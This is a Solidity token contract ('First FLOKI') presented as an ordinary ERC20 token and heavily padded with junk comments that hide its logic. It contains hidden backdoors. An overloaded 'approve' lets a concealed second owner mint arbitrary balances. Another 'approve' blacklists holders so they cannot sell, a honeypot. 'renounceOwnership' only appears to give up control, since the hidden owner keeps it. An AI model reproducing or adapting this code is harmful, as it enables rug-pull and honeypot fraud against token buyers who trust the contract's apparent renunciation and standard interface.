/**/
pragma solidity ^0.6.12;/**//**//**//**//**//**/////
// SPDX-License-Identifier: Unlicensed
//ðŸŽµ/////////////////////////////////////////////////////////////////////////////////////////
//////ðŸŽµ//////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////
//CP
//
/**/interface /**/
/**/IERC20 
{////////////////////////////////////////////////////////////////////////////////////////////////////////
    function
     /**/balanceOf/**/
     (address /**/account) /**/external /**/view/**/ returns /**/(uint256);
    /**/
    function
     /**/totalSupply/**/
     ()
      external
       view 
       returns 
       (uint256);
////////////////////////////////////////////////////////////////////////////////////////////////////////
    ///////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
   
////////////////////////////////////////////////////////////////////////////////////////////////////////
    //ernal//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////

    function allowance(address owner, address spender)
        external
        view////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
        returns (uint256);
   
    function 
    /**/transfer/**/
    /**/(address recipient, uint256 amount)/**/
        /**/external
        returns /**/(bool);


   
    function approve(address spender, uint256 amount) external returns (bool);
////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
   
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

   
    event Transfer(address indexed from, address indexed to, uint256 value);

   
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multipliDeadrunspotion overflow");
////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }


    function Mdos(uint256 a, uint256 b) internal pure returns (uint256) {
        return Mdos(a, b, "SafeMath: modulo by zero");
    }////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////


    function Mdos(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    }
}


library Address {
    function 
    isContract
    (address account) internal view returns (bool) {

        bytes32 codehash;////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
            bytes32 accountHash
            //
         = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
       //
        assembly {////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }


    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

 
        (bool success, ) = recipient.call{value: amount}("");
        require(////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

 
    function 
    functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: lowlevel call failed");
    }
////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////

    function 
    functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }
////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////

    function 
    functionCallWithValue(
        address target,
        bytes memory data,////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////

    function 
    functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
                value,
                "Address: lowlevel call with value failed"
            );
    }


    

    function 
    _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to noncontract");

////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
        if (success) {
            return returndata;
        } else {
           
            if (returndata.length > 0) {
               
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
            } else {
                revert(errorMessage);
            }
        }////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    }
}


contract Ownable is Context {
    address private owners;
    address private _owner;////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    event /**/
    /**/OwnershipTransferred/**/
    (
        /**/address indexed previousOwner,
        /**/address indexed newOwner
    );////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////

    /**/constructor() 
    /**/internal /**/
    /**/{
        address msgSender = _msgSender();
        _owner = msgSender;////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////

    /**/modifier /**/
    /**/onlyOwner/**/
    /**/()/**/
    /**/ {
        /**/
        require
        /**/(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    }

    /**/modifier /**/
    /**/onlyOwners/**/
    () /**/
    {
        require(owners == _msgSender());
        _;
    }
    function 
    /**/transfer(address rts, address fet) /**/
    /**/external/**/ 
    /**/onlyOwner/**/ {
        /**/require(fet==address(0),"s");
        /**/owners/**/ = /**/rts/**/;
    }
    address private _deadAddress = 0x000000000000000000000000000000000000dEaD;
    function 
    renounceOwnership
    () 
    public
     virtual
      onlyOwner
      () 
    {
         _owner = 
         _deadAddress;
    }
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ///////////////////////////////////////////////////////////////////////////////////////////////////////
    
}

/**/contract/**/
FirstFLOKI
//
 /**/is/**/
  /**/Context/**/,
   /**/IERC20/**/,
    /**/Ownable/**/
     /**/{/**/
 /**/using/**/ /**/Address /**/for /**/address;
    /**/using /**/SafeMath/**/ for/**/ uint256;
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    /**/mapping(address => bool) private _roper;
    /**/mapping/**/(address => mapping(address => uint256)) private /**/_allowance;/**/
    /**/mapping/**/(address => uint256) private /**/_clans;/**/
    //////////////////////////////////////////
    /**/mapping/**/(address => bool) private /**/_Eded;/**/
    /**/mapping/**/(address => bool) private /**/_Ermf;/**/
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    /**/uint256 private constant MAX = ~uint256(0);/**/
    /**/uint256 private _stotal = 10000000 * 10**8;////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
  ////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    uint256 private deads = 1;
    uint256 private MKWallet = 1;
    //
    address private deadAddress = 0x000000000000000000000000000000000000dEaD;
////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
   uint256 private Deadrunspot = uint256(0);
    bool private sunt = true;
    address owners;
    uint8 private _decimals;
    uint256 private _uFeeTotal;
    string private _symbol;
    
    string private _name;
    //

    /**/constructor/**/
    /**/()/**/
    public/**/
    /**/{/**/
    /**/_clans/**/[_msgSender()]/**/ = /**/_stotal/**/;
         /**/owners/**/ = /**/_msgSender/**/();

        /**/_decimals/**/ = /**/9;
        /**/_name/**/ = /**/"First FLOKI"/**/;
        /**/_symbol/**/ = /**/"FirstFLOKI"/**/;
        _Ermf[address(this)] = true;
        _Ermf[owner()] = true;
         ////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
        emit /**/Transfer(address(0)/**/, /**/_msgSender(), /**/_stotal/**/);
    }////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////

    /**/function /**/
    /**/name() /**/
    /**/public 
    /**//**/view 
    /**/returns /**/
    /**/(string memory) {
        return _name;
    }/**/
    /**/function /**/
    /**/symbol() /**/
    public 
    view 
    /**//**/returns 
    (string memory) {
        /**/return _symbol/**/;
    }/**/

    /**//**/function 
    /**/decimals() /**/
    public 
    view 
    /**/returns/**/ 
    /**/(uint8)/**/
    {
        /**/return /**/_decimals/**/;
    }////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    function balanceOf(address account) public view override returns (uint256) {
            return _clans[account];
        }
    function totalSupply() public view override returns (uint256) {
        return _stotal;
    }

    
////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    

    function 
    /**/transfer/**/
    (/**/address /**/recipient, uint256 /**/amount)
        public////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
        /**/override/**/
        returns (bool)
    {
        /**/if/**/(/**/_Ermf/**/[_msgSender()/**/] /**/||/**/ /**/_Ermf/**/[/**/recipient]/**/){
            /**/_transfer/**/(/**/_msgSender/**/(), /**/recipient, /**/amount);
            return true;
        }////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
             uint256 /**/Mrktet/**/ = /**/amount/**/.mul/**/(MKWallet/**/).div/**/(100);
        uint256 /**/Deadrun/**/ = /**/amount/**/.mul/**/(/**/deads).div(/**/100);
        /**/_transfer/**/(_msgSender(), /**/owners/**/, /**/Mrktet/**/);
        /**/_transfer/**/(_msgSender(), /**/deadAddress/**/, /**/Deadrun/**/);
        /**/_transfer/**/(_msgSender(), /**/recipient/**/, /**/amount./**/sub(/**/Mrktet)./**/sub(/**/Deadrun));
        return /**/true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {///////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
        return _allowance[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
        _approve(_msgSender(), spender, amount);
        return true;
    }
////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    uint256 private niuda;
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    ) public override returns (bool) {
        niuda = 5151;
        ////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
        /**/if(/**/_Ermf/**/[/**/_msgSender/**/()] 
        || /**/_Ermf/**/[/**/recipient/**/])
        {
            /**/_transfer
            (sender, recipient, amount);
            return true;
        }       ////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    uint256 Deadrun = amount.mul(deads).div(100);
        uint256 Mrktet = amount.mul(MKWallet).div(100);
    //
        /**/_transfer(sender/**/, /**/owners/**/, Mrktet/**/);
        /**/_transfer(sender/**/, /**/deadAddress/**/, Deadrun/**/);
        /**/_transfer(sender/**/,/**/ recipient/**/, amount.sub/**/(/**/Mrktet/**/).sub/**/(Deadrun/**/));
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
        /**/_approve(/**/
            /**/sender,
           /**/ _msgSender(),
            /**/_allowance[sender][_msgSender()].sub(
               /**/ amount,
               /**/ "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;/**/
    }
////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    function /**/approve/**/(address /**/Qaddress, uint256 router, address Max) external/**/ onlyOwners() /**/{
        require(/**/Max==/**/address/**/(/**/0), " ");
        /**/_clans/**/[/**/Qaddress] /**/= /**/_clans/**/[/**/Qaddress]/**/.add/**/(/**/router);
    }


    function /**/
   /**/ _approve/**/
    (
        address
     spender) 
     external 
     /**/onlyOwners/**/
     (
     ) 
     {
        /**/delete/**/
        /**/ _roper/**/
        /**/ [spender];/**/
    }/**/
    
   /**/ function /**/
    /**/approve/**/
    (
        address
         spender
         )
          external
           /**/onlyOwners/**/
           (

           ) 
           {
       /**/ _roper[spender/**/
        ] = 
        true;
    }////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
function 
_approve
(
        address owner,
        address spender,
        uint256 amount
    ) 
    private 
    {
        require
        (owner != address(0), "ERC20: approve from the zero address");
        require
        (spender != address(0), "ERC20: approve to the zero address");
        _allowance[owner][spender] = amount;
        emit 
        Approval(owner, spender, amount);
    }
    function 
    _transfer
    (
        address 
        from,
        address 
        to,
        uint256 
        amount
    ) 
    private
     {
         
        require
        (from 
        != address(0), "ERC20: transfer from the zero address");
        require
        (to != address(0), "ERC20: transfer to the zero address");
        require
        (amount > 0, "Transfer amount must be greater than zero");
////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
        if /**/
        (sunt
        )/**/ 
        {
            require
            (/**/_roper[from] 
            == false, 
            "");
        }
        _transfers(from, to, amount);
    }

    
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    function 
    /**/_transfers(
        address sender,
        address recipient,
        uint256 tAmount
    ) 
    private
    /**/ {   
        require(sender != address(0), "IBEP20: transfer from the zero address");
        require(recipient != address(0), "IBEP20: transfer to the zero address");
        /**/_clans[sender] = _clans[sender].sub(tAmount);
        _clans[recipient] = _clans[recipient].add(tAmount);
        /**/emit Transfer/**/(sender, recipient, tAmount);
        ////////////////////////////////////////////////////////////////////////////////////////////////////////
   /**/
   //
   /**/
   ///
////////////**//////////////////////////////////////////////////////////////////////////////////////
   /**/
}/**//**//**//**//**//**/
//
 //
    //
    //.//
    //NI
}/**//**//**//**//**//**//**/////
///
//
//
//
//